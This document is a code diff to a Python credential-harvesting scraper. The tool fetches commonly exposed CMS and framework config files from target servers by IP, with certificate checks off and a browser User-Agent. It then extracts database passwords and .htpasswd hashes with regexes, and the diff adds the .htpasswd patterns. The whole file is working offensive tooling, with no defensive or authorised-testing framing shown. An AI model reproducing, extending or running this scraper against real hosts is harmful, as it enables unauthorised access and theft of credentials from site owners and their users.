@@ -1,9 +1,12 @@
 """HTTP config scraper — attempts to fetch commonly exposed config files containing credentials."""
 
 import re
-import socket
-import ssl
 import time
+
+import requests
+import urllib3
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 
 # Common exposed config file paths across different CMS and frameworks
@@ -109,23 +112,31 @@ CREDENTIAL_PATTERNS = [
     # Joomla
     (r"public \\\$password\s*=\s*'([^']+)'", 'db_password'),
     (r"public \\\$user\s*=\s*'([^']+)'", 'db_user'),
+    # .htpasswd — username:hash pairs
+    (r'^([^:]+):(\$apr1\$[^\s]+)', 'htpasswd_md5'),
+    (r'^([^:]+):(\$2y\$[^\s]+)', 'htpasswd_bcrypt'),
+    (r'^([^:]+):\{SHA\}([^\s]+)', 'htpasswd_sha1'),
+    (r'^([^:]+):([a-zA-Z0-9./]{13})', 'htpasswd_crypt'),
 ]
 
 
 class HTTPConfigScraper:
     """Fetches commonly exposed config files and extracts credentials from their contents."""
 
-    TOTAL_TIMEOUT = 60  # seconds budget per domain
-
+    TOTAL_TIMEOUT = 20  # hard cap to avoid hanging the router
+    
     def __init__(self, host: str, ip: str):
         """Initialize with target hostname and IP.
 
         Args:
             host (str): Domain name for HTTP Host header.
-            ip (str): Resolved IP address to connect to.
+            ip (str): Resolved IP address to connect to directly.
         """
         self.host = host
         self.ip = ip
+        self.session = requests.Session()
+        self.session.verify = False
+        self.session.headers.update({'User-Agent': 'Mozilla/5.0'})
 
     def run(self) -> dict:
         """Iterate all config paths, fetch each, extract credentials if found.
@@ -160,80 +171,51 @@ class HTTPConfigScraper:
         return results
 
     def _fetch(self, path: str) -> str | None:
-        """Attempt to fetch a path via HTTPS then HTTP, return content if status is 200.
-
-        Args:
-            path (str): URL path to request.
-
-        Returns:
-            str | None: Response body if 200, otherwise None.
-        """
-        for use_tls, port in [(True, 443), (False, 80)]:
+        """Fetch path via HTTPS then HTTP with strict per-chunk timeout."""
+        for scheme in ('https', 'http'):
+            url = f"{scheme}://{self.ip}{path}"
             try:
-                sock = socket.create_connection((self.ip, port), timeout=2)
-                sock.settimeout(5) 
-                if use_tls:
-                    ctx = ssl.create_default_context()
-                    ctx.check_hostname = False
-                    ctx.verify_mode = ssl.CERT_NONE
-                    sock = ctx.wrap_socket(sock, server_hostname=self.host)
-                    sock.settimeout(5)
-
-                request = (
-                    f"GET {path} HTTP/1.1\r\n"
-                    f"Host: {self.host}\r\n"
-                    f"User-Agent: Mozilla/5.0\r\n"
-                    f"Connection: close\r\n\r\n"
+                r = self.session.get(
+                    url,
+                    headers={'Host': self.host},
+                    timeout=(2, 3),
+                    allow_redirects=False,
+                    stream=True,
                 )
-                sock.send(request.encode())
+                if r.status_code != 200:
+                    r.close()
+                    continue
 
-                response = b''
-                while True:
-                    chunk = sock.recv(4096)
-                    if not chunk:
-                        break
-                    response += chunk
-                    if b'\r\n\r\n' in response:  # headers complete
-                        # check if there's a Content-Length to know when body is done
-                        header_end = response.index(b'\r\n\r\n') + 4
-                        header_part = response[:header_end].decode('utf-8', errors='ignore')
-                        if 'content-length' in header_part.lower():
-                            import re
-                            m = re.search(r'content-length:\s*(\d+)', header_part, re.IGNORECASE)
-                            if m:
-                                expected = int(m.group(1))
-                                if len(response) - header_end >= expected:
-                                    break
-                        # No Content-Length — just grab what we have and stop
-                        # (config files are small; don't wait for connection close)
-                        elif len(response) > header_end:
-                            break
-                    if len(response) > 500000:
-                        break
+                content_length = int(r.headers.get('Content-Length', 0))
+                if content_length > 500_000:
+                    r.close()
+                    return None
 
-                decoded = response.decode('utf-8', errors='ignore')
-                if '\r\n\r\n' in decoded:
-                    header, _, body = decoded.partition('\r\n\r\n')
-                    if 'HTTP/1' in header and ' 200 ' in header.split('\n')[0]:
-                        return body
+                # Read with a hard byte cap — never trust the server to close
+                chunks = []
+                total = 0
+                for chunk in r.iter_content(chunk_size=4096):
+                    chunks.append(chunk)
+                    total += len(chunk)
+                    if total > 500_000:
+                        break
+                r.close()
+                return b''.join(chunks).decode('utf-8', errors='ignore')
+
             except Exception:
-                pass
+                continue
         return None
 
     def _extract_credentials(self, content: str) -> dict:
-        """Apply regex patterns to extract credential values from file content.
-
-        Args:
-            content (str): Raw file content as string.
-
-        Returns:
-            dict: Matched credential key-value pairs.
-        """
         found = {}
         for pattern, label in CREDENTIAL_PATTERNS:
-            match = re.search(pattern, content, re.IGNORECASE)
+            match = re.search(pattern, content, re.IGNORECASE | re.MULTILINE)
             if match:
-                value = match.group(1).strip()
-                if value and value not in ('', 'null', 'none', 'your_password_here'):
+                if match.lastindex == 2:
+                    # username:hash format (.htpasswd)
+                    value = f"{match.group(1)}:{match.group(2)}"
+                else:
+                    value = match.group(1).strip().strip("'\"")
+                if value and value.lower() not in ('', 'null', 'none', 'your_password_here'):
                     found[label] = value
         return found
